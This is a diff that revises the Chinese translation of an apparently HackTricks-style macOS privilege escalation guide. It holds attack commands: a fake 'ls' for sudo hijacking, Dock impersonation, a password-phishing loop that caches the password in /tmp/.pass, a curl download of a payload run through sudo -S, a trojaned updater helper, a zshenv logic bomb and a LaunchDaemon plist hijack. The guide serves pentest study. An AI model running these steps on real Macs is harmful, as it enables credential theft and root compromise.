@@ -4,7 +4,7 @@
 
 ## TCC Privilege Escalation
 
-如果你来到这里是为了查找 TCC privilege escalation，请前往：
+如果你来到这里是为了寻找 TCC privilege escalation，请前往：
 
 
 {{#ref}}
@@ -20,13 +20,13 @@ macos-security-protections/macos-tcc/
 ../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
 {{#endref}}
 
-## User Interaction
+## 用户交互
 
 ### Sudo Hijacking
 
 你可以在 Linux Privilege Escalation 文章中找到原始的 [Sudo Hijacking technique](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)。
 
-但是，macOS 在用户执行 **`sudo`** 时会**保留**用户的 **`PATH`**。这意味着，实现此攻击的另一种方式是 **hijack victim 在**运行 sudo 时仍会执行的其他 binary：
+但是，macOS 在用户执行 **`sudo`** 时会**保留**用户的 **`PATH`**。这意味着，实现此攻击的另一种方式是**劫持受害者在**运行 sudo** 时仍会执行的其他二进制文件：**
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<'EOF'
@@ -41,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-注意，使用 terminal 的用户很可能已经**安装了 Homebrew**。因此，可以劫持 **`/opt/homebrew/bin`** 中的二进制文件。
+注意，使用 terminal 的用户极有可能已经**安装 Homebrew**。因此，可以劫持 **`/opt/homebrew/bin`** 中的 binaries。
 
 ### Dock Impersonation
 
-通过一些**social engineering**，你可以在 Dock 中**冒充例如 Google Chrome**，并实际执行自己的脚本：
+通过一些**social engineering**，你可以在 Dock 中**冒充**例如 Google Chrome，并实际执行你自己的 script：
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
 一些建议：
 
-- 检查 Dock 中是否有 Chrome；如果有，则**移除**该条目，并将**fake** **Chrome 条目添加到 Dock 数组中的相同位置**。
+- 检查 Dock 中是否存在 Chrome；如果存在，则**移除**该条目，并将**fake** **Chrome 条目添加到 Dock array 中的相同位置**。
 
 <details>
 <summary>Chrome Dock impersonation script</summary>
@@ -131,11 +131,11 @@ killall Dock
 {{#tab name="Finder Impersonation"}}
 一些建议：
 
-- 你**无法从 Dock 中移除 Finder**，因此如果要将其添加到 Dock，可以将 fake Finder 放在真正的 Finder 旁边。为此，你需要**将 fake Finder 条目添加到 Dock 数组的开头**。
-- 另一种方法是不将其放入 Dock，而是直接打开它；“Finder asking to control Finder”并不奇怪。
-- 另一种**无需通过可疑对话框询问密码即可提权到 root**的方法，是让 Finder 确实请求密码来执行特权操作：
-- 让 Finder 将一个新的 **`sudo`** 文件复制到 **`/etc/pam.d`**（要求输入密码的提示会显示“Finder wants to copy sudo”）
-- 让 Finder 复制一个新的 **Authorization Plugin**（你可以控制文件名，这样要求输入密码的提示会显示“Finder wants to copy Finder.bundle”）
+- 你**无法从 Dock 中移除 Finder**，因此如果要将其添加到 Dock，可以把伪造的 Finder 放在真正的 Finder 旁边。为此，你需要**将伪造的 Finder 条目添加到 Dock 数组的开头**。
+- 另一种选择是不将其放入 Dock，而是直接打开它；“Finder 请求控制 Finder”并不奇怪。
+- 另一种**无需询问密码即可提权到 root**、且不使用可疑对话框的方法，是让 Finder 真正请求密码来执行特权操作：
+- 让 Finder 将一个新的 **`sudo`** 文件复制到 **`/etc/pam.d`**（要求输入密码的提示会显示“Finder 想要复制 sudo”）
+- 让 Finder 复制一个新的 **Authorization Plugin**（你可以控制文件名，这样要求输入密码的提示会显示“Finder 想要复制 Finder.bundle”）
 
 <details>
 <summary>Finder Dock impersonation script</summary>
@@ -219,7 +219,7 @@ Malware 经常滥用用户交互来**捕获具备 sudo 权限的密码**，并�
 
 1. 使用 `whoami` 识别已登录用户。
 2. **循环显示密码提示**，直到 `dscl . -authonly "$user" "$pw"` 返回成功。
-3. 缓存凭据（例如 `/tmp/.pass`），并通过 `sudo -S` 驱动特权操作（通过标准输入传递密码）。
+3. 缓存凭据（例如 `/tmp/.pass`），并使用 `sudo -S` 驱动特权操作（通过标准输入传递密码）。
 
 最小示例链：
 ```bash
@@ -232,13 +232,13 @@ printf '%s\n' "$pw" > /tmp/.pass
 curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
-窃取的密码随后可用于通过 `xattr -c` **清除 Gatekeeper quarantine**、复制 LaunchDaemons 或其他特权文件，并以非交互方式运行其他 stages。
+窃取的密码随后可以通过 **使用 `xattr -c` 清除 Gatekeeper quarantine** 重新使用，复制 LaunchDaemons 或其他特权文件，并以非交互方式运行后续阶段。
 
 ## 较新的 macOS-specific vectors（2023–2025）
 
-### 已弃用的 `AuthorizationExecuteWithPrivileges` 仍可用
+### 已弃用的 `AuthorizationExecuteWithPrivileges` 仍可使用
 
-`AuthorizationExecuteWithPrivileges` 在 10.7 中已弃用，但**在 Sonoma/Sequoia 上仍然有效**。许多商业 updaters 会使用不受信任的路径调用 `/usr/libexec/security_authtrampoline`。如果目标 binary 对用户可写，你可以植入 trojan 并利用合法的 prompt：
+`AuthorizationExecuteWithPrivileges` 在 10.7 中已弃用，但**在 Sonoma/Sequoia 上仍然有效**。许多商业更新器会使用不受信任的路径调用 `/usr/libexec/security_authtrampoline`。如果目标 binary 对用户可写，你可以植入 trojan 并利用合法的提示：
 ```bash
 # find vulnerable helper calls
 log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'
@@ -248,14 +248,14 @@ cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
 chmod +x /Users/me/Library/Application\ Support/Target/helper
 # when the app updates, the root prompt spawns your payload
 ```
-结合上面的 **masquerading tricks**，伪装出一个可信的密码对话框。
+结合上面的 **masquerading tricks**，构造一个可信的密码对话框。
 
 
-### Privileged helper / XPC 初步检查
+### Privileged helper / XPC 分析
 
-许多现代第三方 macOS privescs 都遵循相同模式：一个 **root LaunchDaemon** 从 **`/Library/PrivilegedHelperTools`** 暴露 **Mach/XPC service**，随后该 helper 要么**不验证 client**，要么验证得**太晚**（PID race），要么暴露一个会处理**用户可控路径/脚本**的 **root method**。这类 bug 导致了近期 VPN client、游戏启动器和更新器中出现的许多 helper 漏洞。
+许多现代第三方 macOS privesc 都遵循相同模式：一个 **root LaunchDaemon** 从 **`/Library/PrivilegedHelperTools`** 暴露 **Mach/XPC service**，随后该 helper 要么**不验证 client**，要么验证得**太晚**（PID race），要么暴露一个会处理**用户可控路径/脚本**的 **root method**。许多近期 VPN client、游戏启动器和 updater 中的 helper 漏洞都属于这一 bug class。<sup>[4]</sup>
 
-快速初步检查清单：
+快速分析清单：
 ```bash
 ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
 plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
@@ -268,16 +268,16 @@ done
 特别注意以下类型的 helper：
 
 - 在 **uninstall** 后仍继续接受请求，因为该 job 仍加载在 `launchd` 中
-- 执行脚本或从 **`/Applications/...`** 或其他由非 root 用户可写的路径读取配置
-- 依赖基于 **PID** 或仅基于 **bundle-id** 的 peer 验证，而这类验证可能存在 race condition
+- 执行脚本或从 **`/Applications/...`** 或其他可由非 root 用户写入的路径读取配置
+- 依赖基于 **PID** 或仅基于 **bundle-id** 的 peer 验证，而这类验证可能存在竞态条件
 
-有关 helper authorization bugs 的更多详情，请查看 [this page](macos-proces-abuse/macos-ipc/inter-process-communication/macos-xpc/macos-xpc-authorization.md)。
+有关 helper 授权 bug 的更多详情，请查看 [此页面](macos-proces-abuse/macos-ipc/inter-process-communication/macos-xpc/macos-xpc-authorization.md)。
 
 ### PackageKit script environment inheritance (CVE-2024-27822)
 
-在 Apple 于 **Sonoma 14.5**、**Ventura 13.6.7** 和 **Monterey 12.7.5** 中修复该问题之前，通过 **`Installer.app`** / **`PackageKit.framework`** 由用户发起的安装可能会在当前用户的环境中以 root 身份执行 **PKG scripts**。这意味着，使用 **`#!/bin/zsh`** 的 package 会加载攻击者的 **`~/.zshenv`**，并在受害者安装该 package 时以 root 身份运行其中的内容。
+在 Apple 于 **Sonoma 14.5**、**Ventura 13.6.7** 和 **Monterey 12.7.5** 中修复该问题之前，通过 **`Installer.app`** / **`PackageKit.framework`** 由用户发起的安装可能会在当前用户的环境中以 root 身份执行 **PKG scripts**。这意味着，使用 **`#!/bin/zsh`** 的 package 会加载攻击者的 **`~/.zshenv`**，并在受害者安装该 package 时以 **root** 身份运行它。<sup>[3]</sup>
 
-这作为 **logic bomb** 尤其值得关注：你只需要在用户账户中取得 foothold，并拥有一个可写的 shell startup file，然后等待用户执行任何存在漏洞的 **基于 zsh** 的 installer。通常这不适用于 **MDM/Munki** 部署，因为它们在 root 用户的环境中运行。
+这作为 **logic bomb** 尤其值得关注：你只需要在用户账户中取得 foothold，并拥有一个可写的 shell startup file，然后等待用户执行任何存在漏洞的、基于 **zsh** 的 installer。通常，这并不适用于 **MDM/Munki** 部署，因为它们会在 root 用户的环境中运行。<sup>[3]</sup>
 ```bash
 # inspect a vendor pkg for shell-based install scripts
 pkgutil --expand-full Target.pkg /tmp/target-pkg
@@ -287,11 +287,11 @@ rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg
 # logic bomb example for vulnerable zsh-based installers
 echo 'id > /tmp/pkg-root' >> ~/.zshenv
 ```
-如果你想深入了解特定于 installer 的滥用方式，也请查看[此页面](macos-files-folders-and-binaries/macos-installers-abuse.md)。
+如果你想深入了解特定于 installer 的滥用方式，也可以查看[此页面](macos-files-folders-and-binaries/macos-installers-abuse.md)。
 
-### LaunchDaemon plist hijack（CVE-2025-24085 模式）
+### LaunchDaemon plist hijack（CVE-2025-24085 pattern）
 
-如果 LaunchDaemon plist 或其 `ProgramArguments` 目标为**用户可写**，你可以通过替换它，然后强制 launchd 重新加载来实现权限提升：
+如果某个 LaunchDaemon plist 或其 `ProgramArguments` target 对 **user-writable**，你可以通过替换它，然后强制 launchd 重新加载来实现 privilege escalation：
 ```bash
 sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
 cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
@@ -308,36 +308,36 @@ cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
 PLIST
 sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
 ```
-这与 **CVE-2025-24085** 中发布的 exploit 模式相似：攻击者滥用可写的 plist，以 root 身份执行代码。
+这与 **CVE-2025-24085** 中公布的 exploit 模式类似：攻击者利用可写的 plist，以 root 身份执行攻击者代码。
 
 ### XNU SMR credential race (CVE-2025-24118)
 
-`kauth_cred_proc_update` 中存在一个 **race**，本地攻击者可以通过在线程之间反复执行 `setgid()`/`getgid()` 循环，直到发生撕裂的 `memcpy`，从而破坏只读 credential pointer（`proc_ro.p_ucred`）。成功破坏后可获得 **uid 0** 和内核内存访问权限。最小 PoC 结构：
+`kauth_cred_proc_update` 中存在一个 **race**，本地攻击者可以在线程之间反复竞争执行 `setgid()`/`getgid()` 循环，直到发生撕裂的 `memcpy`，从而破坏只读 credential 指针（`proc_ro.p_ucred`）。成功破坏后可获得 **uid 0** 和 kernel memory 访问权限。最小 PoC 结构如下：
 ```c
 // thread A
 while (1) setgid(rand());
 // thread B
 while (1) getgid();
 ```
-结合 heap grooming，将可控数据放置到指针重新读取的位置。在易受攻击的构建版本上，这是一种可靠的**本地 kernel privesc**，且不要求绕过 SIP。
+结合 heap grooming，将受控数据布置到指针重新读取的位置。在易受攻击的 builds 上，这是一种可靠的 **local kernel privesc**，且不要求绕过 SIP。<sup>[2]</sup>
 
-### 通过 Migration Assistant 绕过 SIP（"Migraine"，CVE-2023-32369）
+### 通过 Migration assistant 绕过 SIP（"Migraine"，CVE-2023-32369）
 
-即使你已经获得 root，SIP 仍会阻止对系统位置的写入。**Migraine** 漏洞滥用 Migration Assistant entitlement `com.apple.rootless.install.heritable`，生成一个继承 SIP bypass 的子进程，并覆盖受保护的路径（例如 `/System/Library/LaunchDaemons`）。攻击链如下：
+如果你已经获得 root，SIP 仍会阻止对系统位置的写入。**Migraine** 漏洞滥用 Migration Assistant 的 entitlement `com.apple.rootless.install.heritable`，生成一个继承 SIP bypass 的子进程，并覆盖受保护的路径（例如 `/System/Library/LaunchDaemons`）。<sup>[1]</sup>攻击链如下：
 
 1. 在运行中的系统上获得 root。
 2. 使用构造的状态触发 `systemmigrationd`，使其运行攻击者控制的 binary。
-3. 使用继承的 entitlement 修改受 SIP 保护的文件，即使重启后仍可持久化。
+3. 使用继承的 entitlement 修改受 SIP 保护的文件，即使重启后仍能保持持久化。
 
 ### NSPredicate/XPC expression smuggling（CVE-2023-23530/23531 bug class）
 
-多个 Apple daemon 通过 XPC 接受 **NSPredicate** 对象，但只验证由攻击者控制的 `expressionType` 字段。通过构造一个可执行任意 selector 的 predicate，可以在 root/system XPC services（例如 `coreduetd`、`contextstored`）中实现**代码执行**。如果与初始的 app sandbox escape 结合使用，则可以在无需用户提示的情况下实现**权限提升**。应查找会反序列化 predicate 且缺少 robust visitor 的 XPC endpoints。
+多个 Apple daemons 通过 XPC 接受 **NSPredicate** 对象，却只验证由攻击者控制的 `expressionType` 字段。通过构造一个可执行任意 selectors 的 predicate，你可以在 root/system XPC services（例如 `coreduetd`、`contextstored`）中实现 **code execution**。当它与初始的 app sandbox escape 结合时，可在无需用户提示的情况下实现 **privilege escalation**。应寻找会反序列化 predicates 且缺少健壮 visitor 的 XPC endpoints。
 
-## TCC - Root 权限提升
+## TCC - Root Privilege Escalation
 
-### CVE-2020-9771 - mount_apfs TCC bypass 和权限提升
+### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
 
-**任何用户**（即使是无特权用户）都可以使用 `-o noowners` 创建并挂载 Time Machine snapshot，并**访问该 snapshot 中的所有文件**，从而绕过 live volume 上的 ownership checks。唯一需要的权限是：所使用的 application（例如 `Terminal`）必须拥有**完全磁盘访问权限**（`kTCCServiceSystemPolicyAllfiles`）。
+**任何用户**（包括未授权用户）都可以使用 `-o noowners` 创建并挂载 Time Machine snapshot，并**访问该 snapshot 中的所有文件**，从而绕过 live volume 上的 ownership checks。唯一需要的权限是：所使用的 application（例如 `Terminal`）必须拥有 **Full Disk Access**（`kTCCServiceSystemPolicyAllfiles`）。
 
 命令和完整说明位于 TCC bypasses 页面：
 
@@ -345,20 +345,20 @@ while (1) getgid();
 macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
 {{#endref}}
 
-## 敏感信息
+## Sensitive Information
 
-以下内容可能有助于提升权限：
+这对于 privilege escalation 很有用：
 
 
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
 
-## 参考资料
+## References
 
-- [Microsoft "Migraine" SIP bypass（CVE-2023-32369）](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
-- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
-- [CVE-2024-27822：macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
-- [CVE-2024-30165：AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
+- [1] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [2] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
+- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
+- [4] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
 
 {{#include ../../banners/hacktricks-training.md}}
